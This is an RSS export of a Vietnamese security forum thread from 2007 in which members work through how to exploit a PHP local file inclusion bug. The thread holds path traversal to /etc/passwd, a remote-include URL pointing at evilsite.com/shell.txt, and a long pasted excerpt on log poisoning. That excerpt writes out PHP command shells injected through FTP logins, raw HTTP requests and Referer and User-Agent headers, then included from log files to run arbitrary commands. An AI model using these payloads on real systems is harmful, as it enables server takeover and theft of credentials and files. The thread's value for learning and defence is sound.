<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "[Thảo luận] Khai thác lỗi này như thế nào ?!"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
		<description><![CDATA[Latest messages posted in the topic "[Thảo luận] Khai thác lỗi này như thế nào ?!"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Ở đây, QVT có 1 ví dụ.
Chúng ta có 1 web app dính bug <b><font color='yellow'>local inclusion</font></b>.
Code ví dụ cùa web app đó:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?php
…
include&#40;“/home/hostings/webs/victim.net/htdocs/web/”.$_GET&#91;‘html’&#93;&#41;;
…
?&gt;</pre>
		</div>

<b><font color='orange'>Điều kiện hiện tại</font></b>: website sử dụng Apache (cứ cho là) <b><font color='yellow'>cài đặt mặc định</font></b> (tức ko thay đổi các thiết lập về đường dẫn, config file, log file.v.v.), PHP4, Safemode OFF và <b><font color='yellow'>attacker không được phép đưa bất cứ thứ gì lên website đó</font></b>.

<b><font color='orange'>Thảo luận:</font></b> Làm thế nào để "hack" website đấy.

<font color='red'>Xin chú ý:</font> đọc kĩ phần điều kiện, lời giải nằm trong đó.

]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76069</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76069</link>
				<pubDate><![CDATA[Thu, 2 Aug 2007 03:52:08]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Quan Vân Trường wrote:</cite><br>
		<blockquote>...

<b><font color='orange'>Điều kiện hiện tại</font></b>: website sử dụng Apache (cứ cho là) <b><font color='yellow'>cài đặt mặc định</font></b> (tức ko thay đổi các thiết lập về đường dẫn, config file, log file.v.v.), PHP4, Safemode OFF và <b><font color='yellow'>attacker không được phép đưa bất cứ thứ gì lên website đó</font></b>.
...&nbsp;
		</blockquote>

Apache cho *nix hay Windows em? Vì chúng khác nhau.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76151</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76151</link>
				<pubDate><![CDATA[Thu, 2 Aug 2007 12:50:48]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Dạ, ở đây mình cho ví dụ là trên *nix (vì trường hợp em gặp là *nix:-P) )..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76153</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76153</link>
				<pubDate><![CDATA[Thu, 2 Aug 2007 12:54:29]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Local Inclusion:
1. ./../../../../../../etc/passwd
2. Upload một file ảnh chứa script lên site ( giả sử ta có thể biết đích xác vị trí file đc store ).
tạm thời là như thế để mọi người còn thảo luận]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76197</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76197</link>
				<pubDate><![CDATA[Thu, 2 Aug 2007 14:57:09]]> GMT</pubDate>
				<author><![CDATA[ xnohat]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ cho anh tham gia ko Wan Vũ ?? :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76201</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76201</link>
				<pubDate><![CDATA[Thu, 2 Aug 2007 15:03:47]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ @ nohat: 
1/ ko sai
2/ anh đọc kĩ "Điều kiện hiện tại"

@ gamma: anh bít rõ trò này rùi mà còn đòi tham gia á :D..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76204</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76204</link>
				<pubDate><![CDATA[Thu, 2 Aug 2007 15:10:25]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ .. hình như ko anh nào hứng thú với chủ đề này :(.. View count hơn 80 rồi mà chẳng dc mấy người tham gia :(..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76369</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76369</link>
				<pubDate><![CDATA[Fri, 3 Aug 2007 00:40:48]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Quan Vân Trường wrote:</cite><br>
		<blockquote>.. hình như ko anh nào hứng thú với chủ đề này :(.. View count hơn 80 rồi mà chẳng dc mấy người tham gia :(..&nbsp;
		</blockquote>

Sao lại không ??? thì cũng đang theo dõi ấy mà  ..hehe :D). Để xem mọi người thảo luận sao rồi mình còn bắt trước ...hehe.. mà tại sao gamma95 lại không được tham gia nhễ.  :?:)  . Bác gamma95 có gì hay thì cứ post lên cho anh em tham khảo cũng được mà ..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76418</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76418</link>
				<pubDate><![CDATA[Fri, 3 Aug 2007 06:51:34]]> GMT</pubDate>
				<author><![CDATA[ L0ng3ta]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Quan Vân Trường wrote:</cite><br>
		<blockquote>.. hình như ko anh nào hứng thú với chủ đề này :(.. View count hơn 80 rồi mà chẳng dc mấy người tham gia :(..&nbsp;
		</blockquote>
 :lol:)  vẫn theo dõi mà ,nhưng đề bài ra hơi khó nên đợi các cáo kiến để xem  :lol:) ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76441</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76441</link>
				<pubDate><![CDATA[Fri, 3 Aug 2007 10:55:55]]> GMT</pubDate>
				<author><![CDATA[ zeno]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Thêm 1 gợi ý nhe: liên quan đến HTTP Header :).

P/S: mún đí VNSECON wá mà ko đi dc :(..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76462</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76462</link>
				<pubDate><![CDATA[Fri, 3 Aug 2007 12:10:01]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ site.com/?html=http://evilsite.com/shell.txt

]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76752</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76752</link>
				<pubDate><![CDATA[Sat, 4 Aug 2007 09:19:21]]> GMT</pubDate>
				<author><![CDATA[ nora]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">nora wrote:</cite><br>
		<blockquote>site.com/?html=http://evilsite.com/shell.txt

&nbsp;
		</blockquote>

Đề bài ở đây là <b><font color='yellow'>"local inclusion"</font></b> nora ơi  :)) ..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76924</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#76924</link>
				<pubDate><![CDATA[Sat, 4 Aug 2007 23:01:57]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Có phải sử dụng HTTP Request Smuggling không QVT? Nếu đúng thì cũng chưa biết khai thác thế nào :P) hình như là inject code vào http request?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77022</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77022</link>
				<pubDate><![CDATA[Sun, 5 Aug 2007 14:44:15]]> GMT</pubDate>
				<author><![CDATA[ pnco]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ @ anh pnco: Chính xác. Tiếp tục đi anh :D. Khai thác thế nào nữa đây ạh..

(P/S: tới giờ mới biết cái này kêu là "HTTP Request Smuggling". Hì hì :P)..)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77096</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77096</link>
				<pubDate><![CDATA[Sun, 5 Aug 2007 19:43:31]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Quan Vân Trường wrote:</cite><br>
		<blockquote>@ anh pnco: Chính xác. Tiếp tục đi anh :D. Khai thác thế nào nữa đây ạh..

(P/S: tới giờ mới biết cái này kêu là "HTTP Request Smuggling". Hì hì :P)..)&nbsp;
		</blockquote>

:)), có lẽ em nên hé mở thêm một tí (ví dụ, apache phiên bản từ xyz nào đó, ở chế độ mặc định không kiểm soát dữ liệu trên HTTP header abc nào đó....) :)).]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77271</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77271</link>
				<pubDate><![CDATA[Mon, 6 Aug 2007 13:01:16]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Ghi chú: 
Code lỗi inclusion dạng:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?php
…
include&#40;“/home/hostings/webs/victim.net/htdocs/web/”.$_GET&#91;‘html’&#93;&#41;;
…
?&gt;</pre>
		</div>

@ anh conmale:
Dạ, Apache 1.x trở đi, ở đây cho là Apache 2 lun  :mrgreen: . Ở phần điều kiện em có ghi là "cài đặt mặc định" tức "không kiểm soát dữ liệu trên HTTP header abc nào đó" lun đó anh  :)) ..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77273</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77273</link>
				<pubDate><![CDATA[Mon, 6 Aug 2007 13:02:34]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ ... Thêm 1 gợi ý nữa nhe..
Có liên quan tới log..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77421</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77421</link>
				<pubDate><![CDATA[Mon, 6 Aug 2007 22:12:38]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ ...nếu log file là symlink của /dev/null thì sao.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77441</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77441</link>
				<pubDate><![CDATA[Mon, 6 Aug 2007 23:41:00]]> GMT</pubDate>
				<author><![CDATA[ gsmth]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gsmth wrote:</cite><br>
		<blockquote>...nếu log file là symlink của /dev/null thì sao.&nbsp;
		</blockquote>

Hì hì, đã nói là <i>"cài đặt mặc định"</i> rồi mà.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77443</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77443</link>
				<pubDate><![CDATA[Mon, 6 Aug 2007 23:52:48]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Dzạ, "cài đặt mặc định".
Ghi chú thêm, với vd trên: 
/home/hostings/webs/victim.net/htdocs/ &lt;== là "webroot"

Và theo mặc định, log dir là:
/home/hostings/webs/victim.net/logs/
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77451</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77451</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 00:10:05]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Em gợi ý hết mức rồi đó :(..
Lời giải đã được đưa ra hết rùi đó ạh, chỉ còn ghép lại thui..]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77657</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77657</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 17:53:21]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <blockquote>Embedding PHP Code into Log Files
Suppose that there is a vulnerability of the local PHP source code injection type on a server.

Note that the attacker doesn't need to create a new file. He or she can just edit an existing one so that it contains some PHP code.

This brings up the question: Which files on the server can a remote user change? You might think that a user without access to the server couldn't change any files. However, remember that the server can log certain events, and what data will be written into the log files depends on the user to some extent.

Consider an example. Suppose that the attacker has investigated the internals of the server using the local PHP source code injection vulnerability. <font color='yellow'>He or she cannot upload a file with malicious PHP code to the server but can obtain the contents of files on the server.
</font>
The attacker is likely to analyze the server settings that have the same names in different systems (e.g., /etc/passwd). In addition, the attacker is likely to try to find the server configuration file that contains much interesting information.

To obtain unauthorized access to directories protected with passwords, the attacker will try to read configuration files that specify how the directories can be accessed. In the Apache server, these files usually have the  .htaccess name.

These files can contain the path to the file with passwords. The attacker can read this file using the vulnerability. Having obtained the contents of the file, he or she can try to find the passwords.

As a rule, such files contain password hashes, rather than the passwords. Although recovering a password from its hash is a complicated problem, it is a matter of time and computational resources to solve it.

An access procedure can also be contained in the server configuration files. In the Apache server, this file is called  HTTPD.CONF. It can be located in various directories, such as the following:
<font color='yellow'>
/ETC/HTTPD.CONF 

/ETC/CONF/HTTPD.CONF 

/ETC/APACHE/CONF/HTTPD.CONF 

/USR/LOCAL/ETC/APACHE/CONF/HTTPD.CONF 

/USR/LOCAL/CONF/HTTPD.CONF </font>

In rare cases, the file can have a name other than  HTTPD.CONF.

The attacker is likely to try reading the contents of system log files. In particular, he or she can be interested in the following files:
<font color='yellow'>
/VAR/LOG/MESSAGES

/VAR/LOG/HTTPD-ACCESS.CONF 

/VAR/LOG/HTTPD-ERROR.LOG 

/VAR/LOG/MAILLOG

/VAR/LOG/SECURITY</font>

These are files in Unix-like operating systems.

Suppose that the attacker noticed that the /VAR/LOG/MESSAGES file is updated daily and has a small size. He or she will analyze, which events are logged in the file. He or she will also analyze other log files available for reading to the user who started the server.

A common situation is authorization errors are logged in the /VAR/LOG/MESSAGES file and some other log files. Suppose that the hacker noticed the following lines in the /VAR/LOG/MESSAGES file:
<font color='yellow'>
Sep  1 00:00:00 server ftpd[12345]: user "anonymous" access denied
Sep  1 00:00:10 server ftpd[12345]: user "vasya" access denied
Sep  1 00:00:20 server ftpd[12345]: user "test" access denied</font>

This means that messages containing FTP server authorization errors are written into this file. Then the attacker will check which characters can be specified in a login. He or she will connect to the server's FTP port and try to authorize using logins with various characters.

A dialog between the attacker and the FTP server could be like this:

  <font color='yellow'> $ telnet ftp.test.ru 21
   Trying 127.0.0.1...
   Connected to ftp.test.ru.
   Escape character is '^]'.
   220 ftp.test.ru FTP server ready.
   USER anonymous
   331 Password required for anonymous.
   PASS test
   530 Login incorrect.
   USER test'test'
   331 Password required for test'test'.
   PASS test
   530 Login incorrect.
   USER test test
   331 Password required for test test.
   PASS test
   530 Login incorrect.
   USER &lt;hello&gt;
   331 Password required for &lt;hello&gt;.
   PASS test
   530 Login incorrect.
   USER test? $test
   331 Password required for test? $test.
   PASS test
   530 Login incorrect.
   QUIT
   221 Goodbye.</font>

In certain FTP server implementations with certain FTP server settings, the /VAR/LOG/MESSAGES file could contain the following lines after this session:

   Sep  1 00:01:00 server ftpd[12345]: user "anonymous" access denied
   Sep  1 00:01:10 server ftpd[12345]: user "test'test'" access denied
   Sep  1 00:01:20 server ftpd[12345]: user "test test" access denied
   Sep  1 00:01:30 server ftpd[12345]: user "&lt;hello&gt;&quot; access denied
   Sep  1 00:01:40 server ftpd[12345]: user &quot;test? $test&quot; access denied


As you can see, the logins are written to the log file as they are. The hacker can embed PHP shell code into the /VAR/LOG/MESSAGES file using the following dialog with the FTP server:

<font color='yellow'>   $ telnet ftp.test.ru 21
   Trying 127.0.0.1...
   Connected to ftp.test.ru.
   Escape character is '^]'.
   220 ftp.test.ru FTP server ready.
   USER &lt;? system(stripslashes($_GET['cmd'])); ?&gt;
   331 Password required for &lt;? system(stripslashes($_GET['cmd'])); ?&gt;.
   PASS test
   530 Login incorrect.
   QUIT
   221 Goodbye.
</font>
As a result, the following data will be logged in /var/log/messages:

   Sep  1 00:01:40 server ftpd[12345]: user &quot;&lt;?
          system(stripslashes($_GET['cmd'])); ?&gt;&quot; access denied

The attacker just needs to exploit the local PHP source code injection vulnerability using a request like this:

<font color='yellow'>http://test/test.php?page=./../../../../../var/log/messages%00&cmd=ls+-la 
</font>
Thus, an attacker can execute any command on a vulnerable server.

Note that a similar request was used earlier to obtain the contents of files that didn't contain PHP code.

Now, I'd like to describe another method for embedding PHP code into log files to exploit the vulnerability by including and executing the files. Try to include some code into Apache log files. This task is more difficult than embedding code into FTP server log files because the browser by default will URL-encode certain characters, such as a question mark and a space.

A simple example demonstrates that spaces aren't necessary when writing PHP shell code:

   &lt;?system(stripslashes($cmd));?&gt;

This is correct PHP code although it contains no spaces.

However, other URL-encoded characters are still required. These are &lt;, &gt;, $, (, ), and ?. In addition, you may need quotation marks or apostrophes.

What if you don't stick to the standard and try to create a request so that the characters you need aren't URL-encoded?

To do this, you can use the program making any requests, which was described earlier, or create the request manually by connecting to the HTTP server port.

 <font color='yellow'>  GET /?&lt;?system(stripslashes($_GET['cmd']));?&gt; HTTP/1.1
   Accept: */*.
   Accept-Language: en-us.
   Accept-Encoding: deflate.
   User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)
   Host: www.test.ru
   Connection: Close
   Referer:<span class="link"> http://www.localhost.ru/</span></font>

Apache, one of the most popular Web servers, will log the following line:

   <font color='yellow'>127.0.0.1 - - [01/Sep/2004:14:00:00 +0000] &quot; GET
   /?&lt;?system(stripslashes($_GET['cmd']));?&gt; HTTP/1.1&quot; 200 2393 &quot;
  <span class="link"> http://www.localhost.ru/&quot;</span> &quot; Mozilla/4.0 (compatible; MSIE 5.0;
   Windows NT 5.0)&quot;</font>

As you can see, this line contains correct PHP code that can be executed by the PHP interpreter:

   &lt;?system(stripslashes($_GET['cmd']));?&gt;

Suppose the log file that contains successful requests is the following: /VAR/LOG/HTTPD-ACCESS.LOG. To exploit the include(&quot;.. /data/$id.html&quot;) vulnerability, the attacker would send a request that could include the log file to execute the PHP shell code that executes any system command. The request should be like this:
<span class="link"> http://test/test.php?page=./../../../../../var/log/httpd-access.log%00&cmd=ls+-la</span> 

Consider another example of embedding PHP shell code into values of the HTTP Referer header:

   GET / HTTP/1.1
   Accept: */*.
   Accept-Language: en-us.
   Accept-Encoding: deflate.
   User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)
   Host: www.test.ru
   Connection: Close
   Referer:<span class="link"> http://www.localhost.ru/?&lt;?system(stripslashes($_GET</span>['cmd']));?&gt;


In this case, the Apache server will write the PHP shell code into the Referer field. The /VAR/LOG/HTTPD-ACCESS. LOG file will contain the following:

   127.0.0.1 - - [01/Sep/2004:14:00:00 +0000] &quot; GET / HTTP/1.1&quot; 200 2393
   &quot;<span class="link"> http://www.localhost.ru/?&lt;?system(stripslashes($_GET</span>['cmd']));?&gt;&quot; &quot;
   Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)&quot;

Writing PHP code into the Referer field is necessary when GET parameters are filtered on the server. For example, this is done when the mod_security module of Apache is used.

Sometimes, it is impossible to embed PHP shell code into the Referer field. For example, if the value of this field is filtered or isn't logged, the attacker can try to embed code into the Agent field of an HTTP request. This field indicates the browser used on the client and, therefore, theoretically can contain any characters.

An example of an HTTP request sending PHP shell code as a browser's name is the following:

   GET / HTTP/1.1
   Accept: */*.
   Accept-Language: en-us.
   Accept-Encoding: deflate.
   User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0 &lt;?
                            system(stripslashes($_GET['cmd'])); ?&gt;)
   Host: www.test.ru
   Connection: Close
   Referer:<span class="link"> http://www.localhost.ru/</span>

The PHP shell code will be there instead of the Agent field if the server logs the value of this field.

If many sites are located on a hosting server, their log files often are individual and are not collected in one file. It is difficult for the attacker to guess the locations of these files. In addition, log files with error messages can be different for different Web sites, and their names are also difficult to guess.

The attacker who can access the configuration file of the Web server can find the locations of these files. However, the Apache server writes certain error messages into the common error log file rather than into error log files of the sites. As a rule, this file is located at /VAR/LOG/HTTPD-ERROR.LOG; however, this isn't always the case.

This file contains error messages that cannot be assigned to a particular host, for example, when the host name sent in the HOST header of an HTTP request isn't found among the names of the virtual hosts on the server.

Here is an example of a request that results in writing the attacker's malicious data into the log file:

   GET /not-existent.html?&lt;?system(stripslashes($_GET['cmd']));?&gt; HTTP/1.1
   Accept: */*.
   Accept-Language: en-us.
   Accept-Encoding: deflate.
   User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)
   Host: www.not-existent.ru
   Connection: Close
   Referer:<span class="link"> http://www.localhost.ru/</span>

The /VAR/LOG/HTTPD-ERROR. LOG file will contain the following lines:

[Wed Sep  1 10:00:05 2004] [error] [client 127.0.0.1] File does not exist: 
/usr/local/www/not existent.html?&lt;?system(stripslashes($_GET['cmd']));?&gt;

As you can see, there is PHP shell code in the log file. However, attempts to embed PHP code into a common error log file are rarely successful. The Apache server often discards GET parameters when adding records to the error log file (this depends on configuration).

Even if you delete the question mark after the name of the nonexistent file, the following line will be written into the log file:

   [Wed Sep  1 10:00:05 2004] [error] [client 127.0.0.1] File does not
   exist: /usr/local/www/not-existent.html&lt;

This is because you have to leave the next question mark in the &lt;? PHP tag.

There can be a rare exception when the PHP interpreter is configured so that it can accept other types of tags, for example, &lt;% %&gt;.

Note that the attacker would avoid embedding into log files a PHP code that is too complicated. If the embedded code contained an error, he or she wouldn't be able to delete it. At the same time, the error in the code would make it impossible to use the file for exploitation of the PHP source code injection.

Therefore, the attacker would test, which characters are written into the log file, before he or she embedded PHP code. The attacker would need to check whether the question mark (?), the greater-than (&gt;) and less-than (&lt;) characters, the apostrophe ('), the quotation mark (&quot;), the dollar sign ($), and the blank space are written into log files without substitution. Based on the results of this test, the attacker would write PHP code that didn't contain filtered characters. In addition, he or she would need to create a request to execute it only once.

The methods for embedding PHP code into log files described here aren't universal. However, they demonstrate the danger of the local PHP source code injection vulnerability.&nbsp;
		</blockquote>
Mình hỏi tụi tây thì nó gợi ý vầy, đọc chẳng hiểu gì? 

 :oops: ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77662</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77662</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 18:14:45]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ iem cũng chẳng hiểu gì,
chỉ bổ sung đoạn trên cho phù hợp, là nếu dùng browser như Firefox thì chèn mã khai tác vào User Agent (được apache log lại trong /home/hostings/webs/victim.net/logs/access_log): about:config &gt;&gt; filter: general.useragent.extra.firefox.
Khai thác lỗi:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>?html=/home/hostings/webs/victim.net/logs/access_log</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77676</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77676</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 18:43:25]]> GMT</pubDate>
				<author><![CDATA[ gsmth]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gsmth wrote:</cite><br>
		<blockquote>iem cũng chẳng hiểu gì,
chỉ bổ sung đoạn trên cho phù hợp, là nếu dùng browser như Firefox thì chèn mã khai tác vào User Agent (được apache log lại trong /home/hostings/webs/victim.net/logs/access_log): about:config &gt;&gt; filter: general.useragent.extra.firefox.
Khai thác lỗi:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>?html=/home/hostings/webs/victim.net/logs/access_log</pre>
		</div>&nbsp;
		</blockquote>
đồng chí đang nói gì vậy?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77684</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77684</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 19:02:25]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Tại vì bị gamma tung hỏa mù :D)
@gsmth: lời giải nằm trong cái đoạn màu vàng.
Cái này có dùng thêm ftp khá hay, không chỉ http và nó thể áp dụng cho trường hợp log file không nằm trong home. Cái /var/log/message nếu bị chmod thì apache có thể không mò tới được, nhưng apache log thì không chạy đi đâu được. Sáng tạo nhất là lợi dụng cái log.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77690</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77690</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 19:17:42]]> GMT</pubDate>
				<author><![CDATA[ pnco]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">gsmth wrote:</cite><br>
		<blockquote>iem cũng chẳng hiểu gì,
chỉ bổ sung đoạn trên cho phù hợp, là nếu dùng browser như Firefox thì chèn mã khai tác vào User Agent (được apache log lại trong /home/hostings/webs/victim.net/logs/access_log): about:config &gt;&gt; filter: general.useragent.extra.firefox.
Khai thác lỗi:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>?html=/home/hostings/webs/victim.net/logs/access_log</pre>
		</div>&nbsp;
		</blockquote>
đồng chí đang nói gì vậy?&nbsp;
		</blockquote>
nói gì là nói gì?  :-o) 
@pnco: đoạn dưới không bôi màu vàng là cho apache log mà.
Edit: à, apache log thì log đủ thứ remote address, request uri, referer ko chỉ có user agent. việc dùng cái nào thì tùy mỗi người mà.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77697</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77697</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 19:46:47]]> GMT</pubDate>
				<author><![CDATA[ gsmth]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ thực ra đề bài QVT cho là thừa dữ kiện, và cái
?html=/home/hostings/webs/victim.net/logs/access_log
của đống chí gsmth
có cách nào đơn giản hơn ko ??
và cách inject code backdoor vào, có cách nào inject khôn hơn tụi tây kia nói ko??]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77702</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77702</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 20:11:56]]> GMT</pubDate>
